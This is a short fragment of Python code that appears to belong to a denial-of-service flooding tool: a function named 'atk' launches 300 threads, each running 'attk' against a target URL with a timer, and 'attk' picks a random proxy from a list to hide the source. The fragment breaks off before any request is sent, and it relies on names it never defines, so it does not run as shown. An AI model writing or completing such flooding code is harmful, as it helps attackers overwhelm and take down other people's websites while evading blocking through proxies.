def atk(url, timer, packet):
   for i in range(int(300)):
       threading.Thread(target=attk, args=(url, timer)).start()
       
def attk(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    